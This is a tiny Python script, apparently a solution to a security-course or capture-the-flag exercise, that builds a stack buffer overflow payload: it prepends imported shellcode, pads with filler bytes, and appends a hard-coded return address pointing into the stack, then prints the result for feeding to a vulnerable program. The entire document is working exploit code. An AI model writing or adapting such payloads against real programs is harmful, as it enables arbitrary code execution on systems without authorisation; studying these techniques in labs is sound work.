from shellcode import shellcode
from struct import pack

addr = pack("<I", 0xbffeb84c)
garbage = "\x69" * (100 - 15 + 4)
print(shellcode + garbage + addr)
